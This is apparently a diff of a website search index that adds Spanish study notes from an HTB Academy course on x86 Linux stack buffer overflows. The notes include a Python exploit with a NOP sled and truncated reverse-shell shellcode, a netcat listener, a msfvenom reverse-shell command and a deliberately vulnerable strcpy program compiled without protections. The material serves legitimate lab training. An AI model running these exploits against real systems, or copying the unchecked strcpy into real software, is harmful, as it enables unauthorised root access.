@@ -2982,46 +2982,319 @@
     "text": "COMPLETED 🎉\n\nDate: 2026-02-19\nAnswer Submitted: 31337\nPlatform: HTB Academy\n\n\n← Back to Security"
   },
   {
-    "objectID": "devops-practices.html",
-    "href": "devops-practices.html",
-    "title": "DevOps Practices",
+    "objectID": "security/buffer-overflow-x86/11-proof-of-concept.html",
+    "href": "security/buffer-overflow-x86/11-proof-of-concept.html",
+    "title": "Proof-of-Concept",
     "section": "",
-    "text": "This section covers DevOps tools and methodologies - configuration management, automation, and infrastructure practices.\n\n\n\n\n\nAnsible Basics - Getting started with Ansible\n\n\n\n\n\nCron Job Deployment - Scheduled task automation\n\n\n\n\n\nMariaDB Troubleshooting - Fixing database services\n\n\n\n\n\n\nAnsible configuration management\nCron job automation\nDatabase service management\nTroubleshooting production issues\n\n\nUse the sidebar to navigate to specific chapters."
+    "text": "Ahora que tenemos todos los componentes, podemos crear el exploit funcional.\n\n\n\n\n\nComponente\nTamaño\nContenido\n\n\n\n\nBuffer\n817 bytes\nPadding\n\n\nNOPs\n124 bytes\nNOP sled\n\n\nShellcode\n95 bytes\nReverse shell\n\n\nEIP\n4 bytes\nDirección de retorno\n\n\n\n\n\n\n#!/usr/bin/env python\n# buffer_overflow_exploit.py\n\n# Padding\nbuffer = \"\\x55\" * 817\n\n# NOP sled\nnops = \"\\x90\" * 124\n\n# Shellcode (reverse shell)\nshellcode = (\n    \"\\xda\\xca\\xba\\xe4\\x11\\xd4\\x5d\\xd9\\x74\\x24\\xf4\\x58\\x29\\xc9\\xb1\"\n    \"\\x12\\x31\\x50\\x17\\x03\\x50\\x17\\x83\\x24\\x15\\x36\\xa8\\x95\\xcd\\x41\"\n    \"\\xb0\\x86\\xb2\\xfe\\x5d\\x2a\\xbc\\xe0\\x12\\x4c\\x73\\x62\\xc1\\xc9\\x3b\"\n    # ... resto del shellcode (95 bytes total)\n)\n\n# Return address (little-endian)\neip = \"\\xf0\\xd5\\xff\\xff\"\n\n# Payload completo\npayload = buffer + nops + shellcode + eip\n\nprint payload\n\n\n\n# En la máquina atacante - escuchar conexiones\nnc -lvnp 31337\n\n# Ejecutar exploit\n./bow $(python buffer_overflow_exploit.py)\n\n\n\nlistening on [any] 31337 ...\nconnect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 12345\nid\nuid=0(root) gid=0(root) groups=0(root)\n\n\n\nCuando modificamos exploits públicos:\n\nVerificar arquitectura - x86 vs x64\nIdentificar offset - Puede variar\nBad characters - Pueden diferir\nDirección de retorno - Calcular para el sistema objetivo\nShellcode - Ajustar LHOST y LPORT\n\n\n\n\n\n\n\nFactor\nImpacto\n\n\n\n\nASLR habilitado\nDirecciones randomizadas\n\n\nDEP activo\nStack no ejecutable\n\n\nStack canary\nDetección de overflow\n\n\nPIE\nCódigo en direcciones variables\n\n\n\n\n\n\n\n\n\nProtección\nBypass\n\n\n\n\nASLR\nInfo leak, brute force\n\n\nDEP\nROP chains\n\n\nStack Canary\nInfo leak del canary\n\n\nPIE\nInfo leak de direcciones\n\n\n\n\n\n\nDespués de explotar:\n\nRestaurar ASLR si se deshabilitó\nDocumentar el exploit\nLimpiar archivos temporales\nReportar la vulnerabilidad"
   },
   {
-    "objectID": "devops-practices.html#chapters",
-    "href": "devops-practices.html#chapters",
-    "title": "DevOps Practices",
+    "objectID": "security/buffer-overflow-x86/11-proof-of-concept.html#componentes-del-exploit",
+    "href": "security/buffer-overflow-x86/11-proof-of-concept.html#componentes-del-exploit",
+    "title": "Proof-of-Concept",
     "section": "",
-    "text": "Ansible Basics - Getting started with Ansible\n\n\n\n\n\nCron Job Deployment - Scheduled task automation\n\n\n\n\n\nMariaDB Troubleshooting - Fixing database services"
+    "text": "Componente\nTamaño\nContenido\n\n\n\n\nBuffer\n817 bytes\nPadding\n\n\nNOPs\n124 bytes\nNOP sled\n\n\nShellcode\n95 bytes\nReverse shell\n\n\nEIP\n4 bytes\nDirección de retorno"
   },
   {
-    "objectID": "devops-practices.html#skills-developed",
-    "href": "devops-practices.html#skills-developed",
-    "title": "DevOps Practices",
+    "objectID": "security/buffer-overflow-x86/11-proof-of-concept.html#exploit-python",
+    "href": "security/buffer-overflow-x86/11-proof-of-concept.html#exploit-python",
+    "title": "Proof-of-Concept",
     "section": "",
-    "text": "Ansible configuration management\nCron job automation\nDatabase service management\nTroubleshooting production issues\n\n\nUse the sidebar to navigate to specific chapters."
+    "text": "#!/usr/bin/env python\n# buffer_overflow_exploit.py\n\n# Padding\nbuffer = \"\\x55\" * 817\n\n# NOP sled\nnops = \"\\x90\" * 124\n\n# Shellcode (reverse shell)\nshellcode = (\n    \"\\xda\\xca\\xba\\xe4\\x11\\xd4\\x5d\\xd9\\x74\\x24\\xf4\\x58\\x29\\xc9\\xb1\"\n    \"\\x12\\x31\\x50\\x17\\x03\\x50\\x17\\x83\\x24\\x15\\x36\\xa8\\x95\\xcd\\x41\"\n    \"\\xb0\\x86\\xb2\\xfe\\x5d\\x2a\\xbc\\xe0\\x12\\x4c\\x73\\x62\\xc1\\xc9\\x3b\"\n    # ... resto del shellcode (95 bytes total)\n)\n\n# Return address (little-endian)\neip = \"\\xf0\\xd5\\xff\\xff\"\n\n# Payload completo\npayload = buffer + nops + shellcode + eip\n\nprint payload"
   },
   {
-    "objectID": "devops-practices/index.html",
-    "href": "devops-practices/index.html",
-    "title": "DevOps Practices",
+    "objectID": "security/buffer-overflow-x86/11-proof-of-concept.html#ejecutar-el-exploit",
+    "href": "security/buffer-overflow-x86/11-proof-of-concept.html#ejecutar-el-exploit",
+    "title": "Proof-of-Concept",
     "section": "",
-    "text": "This section covers DevOps tools and methodologies - configuration management, automation, and infrastructure practices.\n\n\n\n\n\nAnsible Basics - Getting started with Ansible\n\n\n\n\n\nCron Job Deployment - Scheduled task automation\n\n\n\n\n\nMariaDB Troubleshooting - Fixing database services\n\n\n\n\n\n\nAnsible configuration management\nCron job automation\nDatabase service management\nTroubleshooting production issues\n\n\nUse the sidebar to navigate to specific chapters."
+    "text": "# En la máquina atacante - escuchar conexiones\nnc -lvnp 31337\n\n# Ejecutar exploit\n./bow $(python buffer_overflow_exploit.py)"
   },
   {
-    "objectID": "devops-practices/index.html#chapters",
-    "href": "devops-practices/index.html#chapters",
-    "title": "DevOps Practices",
+    "objectID": "security/buffer-overflow-x86/11-proof-of-concept.html#verificar-conexión",
+    "href": "security/buffer-overflow-x86/11-proof-of-concept.html#verificar-conexión",
+    "title": "Proof-of-Concept",
     "section": "",
-    "text": "Ansible Basics - Getting started with Ansible\n\n\n\n\n\nCron Job Deployment - Scheduled task automation\n\n\n\n\n\nMariaDB Troubleshooting - Fixing database services"
+    "text": "listening on [any] 31337 ...\nconnect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 12345\nid\nuid=0(root) gid=0(root) groups=0(root)"
   },
   {
-    "objectID": "devops-practices/index.html#skills-developed",
-    "href": "devops-practices/index.html#skills-developed",
-    "title": "DevOps Practices",
+    "objectID": "security/buffer-overflow-x86/11-proof-of-concept.html#modificación-de-exploits-públicos",
+    "href": "security/buffer-overflow-x86/11-proof-of-concept.html#modificación-de-exploits-públicos",
+    "title": "Proof-of-Concept",
     "section": "",
-    "text": "Ansible configuration management\nCron job automation\nDatabase service management\nTroubleshooting production issues\n\n\nUse the sidebar to navigate to specific chapters."
+    "text": "Cuando modificamos exploits públicos:\n\nVerificar arquitectura - x86 vs x64\nIdentificar offset - Puede variar\nBad characters - Pueden diferir\nDirección de retorno - Calcular para el sistema objetivo\nShellcode - Ajustar LHOST y LPORT"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/11-proof-of-concept.html#consideraciones-de-producción",
+    "href": "security/buffer-overflow-x86/11-proof-of-concept.html#consideraciones-de-producción",
+    "title": "Proof-of-Concept",
+    "section": "",
+    "text": "Factor\nImpacto\n\n\n\n\nASLR habilitado\nDirecciones randomizadas\n\n\nDEP activo\nStack no ejecutable\n\n\nStack canary\nDetección de overflow\n\n\nPIE\nCódigo en direcciones variables"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/11-proof-of-concept.html#bypass-de-protecciones",
+    "href": "security/buffer-overflow-x86/11-proof-of-concept.html#bypass-de-protecciones",
+    "title": "Proof-of-Concept",
+    "section": "",
+    "text": "Protección\nBypass\n\n\n\n\nASLR\nInfo leak, brute force\n\n\nDEP\nROP chains\n\n\nStack Canary\nInfo leak del canary\n\n\nPIE\nInfo leak de direcciones"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/11-proof-of-concept.html#cleanup",
+    "href": "security/buffer-overflow-x86/11-proof-of-concept.html#cleanup",
+    "title": "Proof-of-Concept",
+    "section": "",
+    "text": "Después de explotar:\n\nRestaurar ASLR si se deshabilitó\nDocumentar el exploit\nLimpiar archivos temporales\nReportar la vulnerabilidad"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/10-return-address.html",
+    "href": "security/buffer-overflow-x86/10-return-address.html",
+    "title": "Identification of the Return Address",
+    "section": "",
+    "text": "El último paso es encontrar la dirección de retorno que apunte a nuestro shellcode.\n\n\n\n\n(gdb) run $(python -c 'print \"\\x55\" * 817 + \"\\x90\" * 124 + \"&lt;shellcode&gt;\" + \"\\x66\" * 4')\nCuando ocurra el crash:\n(gdb) info registers esp\nesp            0xffffd5c8\n\n\n\n(gdb) x/500xb $esp\nBuscar la secuencia de NOPs (0x90) y tomar una dirección en medio del NOP sled.\n\n\n\n\nSi los NOPs están en 0xffffd5c0 aproximadamente, elegimos una dirección en medio:\nNOP sled comienza: 0xffffd5c0\nNOP sled termina:  0xffffd63f (124 bytes)\n\nDirección segura: 0xffffd5f0 (mitad del NOP sled)\n\n\n\nx86 usa Little-Endian, por lo que la dirección debe escribirse al revés:\nDirección: 0xffffd5f0\nEn bytes (little-endian): \\xf0\\xd5\\xff\\xff\n\n\n\n# Exploit completo\nbuffer = \"\\x55\" * 817\nnops = \"\\x90\" * 124\nshellcode = \"\\xda\\xca\\xba\\xe4...\"  # 95 bytes\neip = \"\\xf0\\xd5\\xff\\xff\"  # Dirección de retorno\n\npayload = buffer + nops + shellcode + eip\n\n\n\n(gdb) run $(python -c 'print \"\\x55\" * 817 + \"\\x90\" * 124 + \"&lt;shellcode&gt;\" + \"\\xf0\\xd5\\xff\\xff\"')\nEl programa debería saltar a nuestra dirección y ejecutar el NOP sled hasta el shellcode.\n\n\n\n\nPermite margen de error en la dirección exacta\nEl CPU “desliza” a través de NOPs hasta el shellcode\nAumenta la probabilidad de éxito del exploit\n\n\n\n\n\n\n\nDirección\nProblema\n\n\n\n\n0x00000000\nContiene null bytes\n\n\n0x000000xx\nNull bytes en los primeros bytes\n\n\nDirecciones con bad chars\nRompen el payload"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/10-return-address.html#encontrar-la-dirección",
+    "href": "security/buffer-overflow-x86/10-return-address.html#encontrar-la-dirección",
+    "title": "Identification of the Return Address",
+    "section": "",
+    "text": "(gdb) run $(python -c 'print \"\\x55\" * 817 + \"\\x90\" * 124 + \"&lt;shellcode&gt;\" + \"\\x66\" * 4')\nCuando ocurra el crash:\n(gdb) info registers esp\nesp            0xffffd5c8\n\n\n\n(gdb) x/500xb $esp\nBuscar la secuencia de NOPs (0x90) y tomar una dirección en medio del NOP sled."
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/10-return-address.html#calcular-la-dirección-de-retorno",
+    "href": "security/buffer-overflow-x86/10-return-address.html#calcular-la-dirección-de-retorno",
+    "title": "Identification of the Return Address",
+    "section": "",
+    "text": "Si los NOPs están en 0xffffd5c0 aproximadamente, elegimos una dirección en medio:\nNOP sled comienza: 0xffffd5c0\nNOP sled termina:  0xffffd63f (124 bytes)\n\nDirección segura: 0xffffd5f0 (mitad del NOP sled)"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/10-return-address.html#considerar-endianness",
+    "href": "security/buffer-overflow-x86/10-return-address.html#considerar-endianness",
+    "title": "Identification of the Return Address",
+    "section": "",
+    "text": "x86 usa Little-Endian, por lo que la dirección debe escribirse al revés:\nDirección: 0xffffd5f0\nEn bytes (little-endian): \\xf0\\xd5\\xff\\xff"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/10-return-address.html#exploit-final",
+    "href": "security/buffer-overflow-x86/10-return-address.html#exploit-final",
+    "title": "Identification of the Return Address",
+    "section": "",
+    "text": "# Exploit completo\nbuffer = \"\\x55\" * 817\nnops = \"\\x90\" * 124\nshellcode = \"\\xda\\xca\\xba\\xe4...\"  # 95 bytes\neip = \"\\xf0\\xd5\\xff\\xff\"  # Dirección de retorno\n\npayload = buffer + nops + shellcode + eip"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/10-return-address.html#verificar-en-gdb",
+    "href": "security/buffer-overflow-x86/10-return-address.html#verificar-en-gdb",
+    "title": "Identification of the Return Address",
+    "section": "",
+    "text": "(gdb) run $(python -c 'print \"\\x55\" * 817 + \"\\x90\" * 124 + \"&lt;shellcode&gt;\" + \"\\xf0\\xd5\\xff\\xff\"')\nEl programa debería saltar a nuestra dirección y ejecutar el NOP sled hasta el shellcode."
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/10-return-address.html#importancia-del-nop-sled",
+    "href": "security/buffer-overflow-x86/10-return-address.html#importancia-del-nop-sled",
+    "title": "Identification of the Return Address",
+    "section": "",
+    "text": "Permite margen de error en la dirección exacta\nEl CPU “desliza” a través de NOPs hasta el shellcode\nAumenta la probabilidad de éxito del exploit"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/10-return-address.html#direcciones-a-evitar",
+    "href": "security/buffer-overflow-x86/10-return-address.html#direcciones-a-evitar",
+    "title": "Identification of the Return Address",
+    "section": "",
+    "text": "Dirección\nProblema\n\n\n\n\n0x00000000\nContiene null bytes\n\n\n0x000000xx\nNull bytes en los primeros bytes\n\n\nDirecciones con bad chars\nRompen el payload"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/12-skills-assessment.html",
+    "href": "security/buffer-overflow-x86/12-skills-assessment.html",
+    "title": "Skills Assessment",
+    "section": "",
+    "text": "La evaluación práctica pone a prueba todos los conceptos aprendidos en el módulo.\n\n\n\nIdentificar vulnerabilidad de buffer overflow\nDeterminar el offset exacto\nIdentificar bad characters\nGenerar shellcode funcional\nObtener acceso al sistema\n\n\n\n\n\n\nfile &lt;binary&gt;\nstrings &lt;binary&gt;\ngdb -q &lt;binary&gt;\n\n\n\n(gdb) disassemble main\n(gdb) disassemble &lt;funcion&gt;\n\n\n\n# Crear patrón\npattern_create.rb -l 2000\n\n# Ejecutar y obtener EIP\n(gdb) run $(cat pattern.txt)\n(gdb) info registers eip\n\n# Calcular offset\npattern_offset.rb -q 0x&lt;eip_value&gt;\n\n\n\n# Crear lista de todos los bytes\n# Enviar payload con CHARS\n# Examinar stack para encontrar roturas\n(gdb) x/500xb $esp+offset\n\n\n\nmsfvenom -p linux/x86/shell_reverse_tcp \\\n  LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; \\\n  --arch x86 --platform linux \\\n  --bad-chars \"&lt;bad_chars&gt;\" \\\n  -f c\n\n\n\n(gdb) run $(python -c 'print \"&lt;payload&gt;\"')\n(gdb) info registers esp\n(gdb) x/200xb $esp\n\n\n\n# Listener\nnc -lvnp &lt;PORT&gt;\n\n# Ejecutar exploit\n./&lt;binary&gt; $(python exploit.py)\n\n\n\n\n\n\n\nTarea\nCompletado\n\n\n\n\nOffset identificado\n[ ]\n\n\nBad characters encontrados\n[ ]\n\n\nShellcode generado\n[ ]\n\n\nReturn address calculada\n[ ]\n\n\nReverse shell obtenida\n[ ]\n\n\n\n\n\n\n\n\n\nComando\nPropósito\n\n\n\n\npattern_create.rb -l N\nCrear patrón único\n\n\npattern_offset.rb -q ADDR\nCalcular offset\n\n\nmsfvenom -p ...\nGenerar shellcode\n\n\nx/Nxb $esp\nExaminar stack\n\n\ninfo registers eip\nVer EIP\n\n\nnc -lvnp PORT\nListener netcat\n\n\n\n\n\n\n\n\n\nProblema\nSolución\n\n\n\n\nEIP no sobrescrito\nAumentar tamaño del buffer\n\n\nShellcode no ejecuta\nVerificar bad chars\n\n\nConexión rechazada\nVerificar firewall/LPORT\n\n\nCrash sin shell\nVerificar return address\n\n\n\n\n\n\n\nExploit Database\nMetasploit Framework\nShell Storm"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/12-skills-assessment.html#objetivos",
+    "href": "security/buffer-overflow-x86/12-skills-assessment.html#objetivos",
+    "title": "Skills Assessment",
+    "section": "",
+    "text": "Identificar vulnerabilidad de buffer overflow\nDeterminar el offset exacto\nIdentificar bad characters\nGenerar shellcode funcional\nObtener acceso al sistema"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/12-skills-assessment.html#metodología",
+    "href": "security/buffer-overflow-x86/12-skills-assessment.html#metodología",
+    "title": "Skills Assessment",
+    "section": "",
+    "text": "file &lt;binary&gt;\nstrings &lt;binary&gt;\ngdb -q &lt;binary&gt;\n\n\n\n(gdb) disassemble main\n(gdb) disassemble &lt;funcion&gt;\n\n\n\n# Crear patrón\npattern_create.rb -l 2000\n\n# Ejecutar y obtener EIP\n(gdb) run $(cat pattern.txt)\n(gdb) info registers eip\n\n# Calcular offset\npattern_offset.rb -q 0x&lt;eip_value&gt;\n\n\n\n# Crear lista de todos los bytes\n# Enviar payload con CHARS\n# Examinar stack para encontrar roturas\n(gdb) x/500xb $esp+offset\n\n\n\nmsfvenom -p linux/x86/shell_reverse_tcp \\\n  LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; \\\n  --arch x86 --platform linux \\\n  --bad-chars \"&lt;bad_chars&gt;\" \\\n  -f c\n\n\n\n(gdb) run $(python -c 'print \"&lt;payload&gt;\"')\n(gdb) info registers esp\n(gdb) x/200xb $esp\n\n\n\n# Listener\nnc -lvnp &lt;PORT&gt;\n\n# Ejecutar exploit\n./&lt;binary&gt; $(python exploit.py)"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/12-skills-assessment.html#checklist-de-éxito",
+    "href": "security/buffer-overflow-x86/12-skills-assessment.html#checklist-de-éxito",
+    "title": "Skills Assessment",
+    "section": "",
+    "text": "Tarea\nCompletado\n\n\n\n\nOffset identificado\n[ ]\n\n\nBad characters encontrados\n[ ]\n\n\nShellcode generado\n[ ]\n\n\nReturn address calculada\n[ ]\n\n\nReverse shell obtenida\n[ ]"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/12-skills-assessment.html#comandos-clave",
+    "href": "security/buffer-overflow-x86/12-skills-assessment.html#comandos-clave",
+    "title": "Skills Assessment",
+    "section": "",
+    "text": "Comando\nPropósito\n\n\n\n\npattern_create.rb -l N\nCrear patrón único\n\n\npattern_offset.rb -q ADDR\nCalcular offset\n\n\nmsfvenom -p ...\nGenerar shellcode\n\n\nx/Nxb $esp\nExaminar stack\n\n\ninfo registers eip\nVer EIP\n\n\nnc -lvnp PORT\nListener netcat"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/12-skills-assessment.html#troubleshooting",
+    "href": "security/buffer-overflow-x86/12-skills-assessment.html#troubleshooting",
+    "title": "Skills Assessment",
+    "section": "",
+    "text": "Problema\nSolución\n\n\n\n\nEIP no sobrescrito\nAumentar tamaño del buffer\n\n\nShellcode no ejecuta\nVerificar bad chars\n\n\nConexión rechazada\nVerificar firewall/LPORT\n\n\nCrash sin shell\nVerificar return address"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/12-skills-assessment.html#recursos",
+    "href": "security/buffer-overflow-x86/12-skills-assessment.html#recursos",
+    "title": "Skills Assessment",
+    "section": "",
+    "text": "Exploit Database\nMetasploit Framework\nShell Storm"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/index.html",
+    "href": "security/buffer-overflow-x86/index.html",
+    "title": "Stack-Based Buffer Overflows on Linux x86",
+    "section": "",
+    "text": "Este documento contiene las notas completas del módulo Stack-Based Buffer Overflows on Linux x86 de HTB Academy.\n\n\n\n\n\nAspecto\nDetalle\n\n\n\n\nPlataforma\nHTB Academy\n\n\nDificultad\nMedium\n\n\nTier\n0\n\n\nDuración estimada\n7 horas\n\n\nCubos\n10\n\n\n\n\n\n\n\nEntender los fundamentos de buffer overflows\nAprender arquitectura CPU y registros\nDesarrollar exploits básicos\nGenerar shellcode personalizado\nModificar exploits públicos\nImplementar técnicas de prevención\n\n\n\n\n\nIntroduction to Networking\nLinux Fundamentals\n\n\n\n\n\n\n\nSección\nTema\nTipo\n\n\n\n\n1-3\nIntroduction\nTeoría\n\n\n4-5\nFundamentals\nTeoría + Práctica\n\n\n6-10\nExploit Development\nPráctica\n\n\n11-12\nProof-of-Concept\nPráctica\n\n\n13\nSkills Assessment\nEvaluación\n\n\n\n\nAchievement: https://academy.hackthebox.com/achievement/2300153/XX"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/index.html#module-overview",
+    "href": "security/buffer-overflow-x86/index.html#module-overview",
+    "title": "Stack-Based Buffer Overflows on Linux x86",
+    "section": "",
+    "text": "Aspecto\nDetalle\n\n\n\n\nPlataforma\nHTB Academy\n\n\nDificultad\nMedium\n\n\nTier\n0\n\n\nDuración estimada\n7 horas\n\n\nCubos\n10"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/index.html#objetivos-de-aprendizaje",
+    "href": "security/buffer-overflow-x86/index.html#objetivos-de-aprendizaje",
+    "title": "Stack-Based Buffer Overflows on Linux x86",
+    "section": "",
+    "text": "Entender los fundamentos de buffer overflows\nAprender arquitectura CPU y registros\nDesarrollar exploits básicos\nGenerar shellcode personalizado\nModificar exploits públicos\nImplementar técnicas de prevención"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/index.html#prerrequisitos",
+    "href": "security/buffer-overflow-x86/index.html#prerrequisitos",
+    "title": "Stack-Based Buffer Overflows on Linux x86",
+    "section": "",
+    "text": "Introduction to Networking\nLinux Fundamentals"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/index.html#estructura-del-módulo",
+    "href": "security/buffer-overflow-x86/index.html#estructura-del-módulo",
+    "title": "Stack-Based Buffer Overflows on Linux x86",
+    "section": "",
+    "text": "Sección\nTema\nTipo\n\n\n\n\n1-3\nIntroduction\nTeoría\n\n\n4-5\nFundamentals\nTeoría + Práctica\n\n\n6-10\nExploit Development\nPráctica\n\n\n11-12\nProof-of-Concept\nPráctica\n\n\n13\nSkills Assessment\nEvaluación\n\n\n\n\nAchievement: https://academy.hackthebox.com/achievement/2300153/XX"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/04-stack-buffer-overflow.html",
+    "href": "security/buffer-overflow-x86/04-stack-buffer-overflow.html",
+    "title": "Stack-Based Buffer Overflow",
+    "section": "",
+    "text": "Las excepciones de memoria son la reacción del sistema operativo a errores en software. Los buffer overflows son causados por datos demasiado grandes que desbordan un buffer.\n\n\nCuando un programa se ejecuta, sus secciones se mapean a segmentos en el proceso:\n\n\n\nSección\nDescripción\n\n\n\n\n.text\nInstrucciones assembler (read-only)\n\n\n.data\nVariables globales y estáticas inicializadas\n\n\n.bss\nVariables estáticas con valor 0\n\n\nHeap\nMemoria dinámica, crece hacia arriba\n\n\nStack\nLIFO, direcciones de retorno, crece hacia abajo\n\n\n\n\n\n\n\n\n\n\n\n\n\nProtección\nDescripción\n\n\n\n\nDEP\nData Execution Prevention - marca regiones como read-only\n\n\nASLR\nAddress Space Layout Randomization - randomiza direcciones\n\n\nStack Canary\nValores de verificación en stack\n\n\n\n\n\n\n#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint bowfunc(char *string) {\n    char buffer[1024];\n    strcpy(buffer, string);  // Vulnerable - no bounds check\n    return 1;\n}\n\nint main(int argc, char *argv[]) {\n    bowfunc(argv[1]);\n    printf(\"Done.\\n\");\n    return 1;\n}\n\n\n\n# Deshabilitar ASLR\necho 0 &gt; /proc/sys/kernel/randomize_va_space\n\n# Compilar sin protecciones (32-bit)\ngcc bow.c -o bow32 -fno-stack-protector -z execstack -m32\n\n\n\n\n\n\nFunción\nProblema\n\n\n\n\nstrcpy()\nNo verifica tamaño\n\n\ngets()\nNo verifica tamaño\n\n\nsprintf()\nPuede desbordar buffer\n\n\nscanf()\nSin límites de entrada\n\n\nstrcat()\nNo verifica tamaño\n\n\n\n\n\n\n# Iniciar GDB\ngdb -q ./bow32\n\n# Cambiar sintaxis a Intel\nset disassembly-flavor intel\n\n# Desensamblar función\ndisassemble main\ndisassemble bowfunc\n\n\n\nEl stack crece de direcciones altas a bajas:\nDirecciones altas (0xFFFFFFFF)\n├── Argumentos\n├── Variables de entorno\n├── EIP (retorno de main)\n├── EBP (frame pointer)\n├── Variables locales\n├── Buffer\n└── ESP (top of stack)\nDirecciones bajas (0x00000000)\n\n\n\n\n\n\nFormato\nOrden de bytes\n\n\n\n\nBig-Endian\nMSB primero (AA BB CC DD)\n\n\nLittle-Endian\nLSB primero (DD CC BB AA)\n\n\n\nx86 usa Little-Endian - importante para exploits."
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/04-stack-buffer-overflow.html#memory-layout",
+    "href": "security/buffer-overflow-x86/04-stack-buffer-overflow.html#memory-layout",
+    "title": "Stack-Based Buffer Overflow",
+    "section": "",
+    "text": "Cuando un programa se ejecuta, sus secciones se mapean a segmentos en el proceso:\n\n\n\nSección\nDescripción\n\n\n\n\n.text\nInstrucciones assembler (read-only)\n\n\n.data\nVariables globales y estáticas inicializadas\n\n\n.bss\nVariables estáticas con valor 0\n\n\nHeap\nMemoria dinámica, crece hacia arriba\n\n\nStack\nLIFO, direcciones de retorno, crece hacia abajo"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/04-stack-buffer-overflow.html#protecciones-modernas",
+    "href": "security/buffer-overflow-x86/04-stack-buffer-overflow.html#protecciones-modernas",
+    "title": "Stack-Based Buffer Overflow",
+    "section": "",
+    "text": "Protección\nDescripción\n\n\n\n\nDEP\nData Execution Prevention - marca regiones como read-only\n\n\nASLR\nAddress Space Layout Randomization - randomiza direcciones\n\n\nStack Canary\nValores de verificación en stack"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/04-stack-buffer-overflow.html#programa-vulnerable",
+    "href": "security/buffer-overflow-x86/04-stack-buffer-overflow.html#programa-vulnerable",
+    "title": "Stack-Based Buffer Overflow",
+    "section": "",
+    "text": "#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint bowfunc(char *string) {\n    char buffer[1024];\n    strcpy(buffer, string);  // Vulnerable - no bounds check\n    return 1;\n}\n\nint main(int argc, char *argv[]) {\n    bowfunc(argv[1]);\n    printf(\"Done.\\n\");\n    return 1;\n}"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/04-stack-buffer-overflow.html#compilación-vulnerable",
+    "href": "security/buffer-overflow-x86/04-stack-buffer-overflow.html#compilación-vulnerable",
+    "title": "Stack-Based Buffer Overflow",
+    "section": "",
+    "text": "# Deshabilitar ASLR\necho 0 &gt; /proc/sys/kernel/randomize_va_space\n\n# Compilar sin protecciones (32-bit)\ngcc bow.c -o bow32 -fno-stack-protector -z execstack -m32"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/04-stack-buffer-overflow.html#funciones-c-vulnerables",
+    "href": "security/buffer-overflow-x86/04-stack-buffer-overflow.html#funciones-c-vulnerables",
+    "title": "Stack-Based Buffer Overflow",
+    "section": "",
+    "text": "Función\nProblema\n\n\n\n\nstrcpy()\nNo verifica tamaño\n\n\ngets()\nNo verifica tamaño\n\n\nsprintf()\nPuede desbordar buffer\n\n\nscanf()\nSin límites de entrada\n\n\nstrcat()\nNo verifica tamaño"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/04-stack-buffer-overflow.html#gdb---debugging",
+    "href": "security/buffer-overflow-x86/04-stack-buffer-overflow.html#gdb---debugging",
+    "title": "Stack-Based Buffer Overflow",
+    "section": "",
+    "text": "# Iniciar GDB\ngdb -q ./bow32\n\n# Cambiar sintaxis a Intel\nset disassembly-flavor intel\n\n# Desensamblar función\ndisassemble main\ndisassemble bowfunc"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/04-stack-buffer-overflow.html#análisis-del-stack",
+    "href": "security/buffer-overflow-x86/04-stack-buffer-overflow.html#análisis-del-stack",
+    "title": "Stack-Based Buffer Overflow",
+    "section": "",
+    "text": "El stack crece de direcciones altas a bajas:\nDirecciones altas (0xFFFFFFFF)\n├── Argumentos\n├── Variables de entorno\n├── EIP (retorno de main)\n├── EBP (frame pointer)\n├── Variables locales\n├── Buffer\n└── ESP (top of stack)\nDirecciones bajas (0x00000000)"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/04-stack-buffer-overflow.html#endianness",
+    "href": "security/buffer-overflow-x86/04-stack-buffer-overflow.html#endianness",
+    "title": "Stack-Based Buffer Overflow",
+    "section": "",
+    "text": "Formato\nOrden de bytes\n\n\n\n\nBig-Endian\nMSB primero (AA BB CC DD)\n\n\nLittle-Endian\nLSB primero (DD CC BB AA)\n\n\n\nx86 usa Little-Endian - importante para exploits."
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/03-cpu-architecture.html",
+    "href": "security/buffer-overflow-x86/03-cpu-architecture.html",
+    "title": "CPU Architecture",
+    "section": "",
